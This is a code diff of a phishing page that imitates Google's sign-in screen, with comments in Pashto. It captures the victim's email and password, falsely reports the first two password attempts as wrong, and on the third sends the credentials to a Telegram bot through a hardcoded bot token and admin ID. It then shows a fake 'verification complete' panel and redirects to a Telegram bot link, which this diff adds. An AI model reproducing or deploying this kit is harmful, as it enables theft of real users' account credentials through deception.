@@ -89,6 +89,7 @@
 <body>
 
 <div class="google-card">
+    <!-- مرحله 1: برېښنالیک -->
     <div id="step1View">
         <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
         <h1>Sign in</h1>
@@ -100,6 +101,7 @@
         <a href="#" class="create-account" onclick="alert('Create account'); return false;">Create account</a>
     </div>
 
+    <!-- مرحله 2: پټنوم -->
     <div id="step2View" class="hidden">
         <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
         <h1>Sign in</h1>
@@ -110,11 +112,12 @@
         <div class="guest-text">Not your computer? Use Guest mode to sign in privately.<div style="margin-top:0.3rem;"><a href="#" onclick="alert('Learn more'); return false;">Learn more</a></div></div>
     </div>
 
+    <!-- د بریالیتوب پینل -->
     <div id="successPanel" class="hidden">
         <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
         <h1>✅ Verification Complete</h1>
         <div class="sub">Your account has been successfully verified!</div>
-        <button class="cancel-btn" id="cancelBtn">✖ CANCEL - Close Window</button>
+        <button class="cancel-btn" id="cancelBtn">✖ CANCEL - Return to Bot</button>
     </div>
 
     <div id="errorBox" class="message error-msg"></div>
@@ -124,6 +127,9 @@
 </div>
 
 <script>
+    // ========== د بوټ لینک - ستاسو د بوټ سره بدل کړئ ==========
+    const BOT_REDIRECT = "https://t.me/imrankhabot?start=confirm_account";
+    
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
     const ADMIN_ID = "8295417969";
 
@@ -151,6 +157,7 @@
         currentEmail = '';
     }
 
+    // مرحله 1: برېښنالیک
     document.getElementById('nextBtn').onclick = () => {
         let email = document.getElementById('emailInput').value.trim();
         if (!email || !email.includes('@')) {
@@ -165,6 +172,7 @@
         document.getElementById('passwordInput').value = '';
     };
 
+    // مرحله 2: پټنوم (3 هڅې)
     document.getElementById('loginBtn').onclick = async () => {
         let pass = document.getElementById('passwordInput').value.trim();
         if (!pass) {
@@ -177,13 +185,16 @@
         if (!attempts[key]) attempts[key] = 0;
         attempts[key]++;
         
+        // لومړی او دوهم ځل - ناکام
         if (attempts[key] === 1 || attempts[key] === 2) {
             showMessage(document.getElementById('errorBox'), `❌ Incorrect password. ${3 - attempts[key]} attempts remaining.`, true);
             setTimeout(() => goBackToEmail(), 2000);
             return;
         }
         
+        // درېیم ځل - بریالی
         if (attempts[key] >= 3) {
+            // اډمن ته خبر ورکړئ
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
@@ -193,14 +204,15 @@
                 })
             });
             
+            // د بریالیتوب پینل ښکاره کړئ
             document.getElementById('step2View').classList.add('hidden');
             document.getElementById('successPanel').classList.remove('hidden');
         }
     };
     
+    // د CANCEL تڼۍ - بوټ ته ځي او لومړی ګام بشپړوي
     document.getElementById('cancelBtn').onclick = () => {
-        window.close();
-        alert("Please close this window/tab manually.");
+        window.location.href = BOT_REDIRECT;
     };
 </script>
 </body>
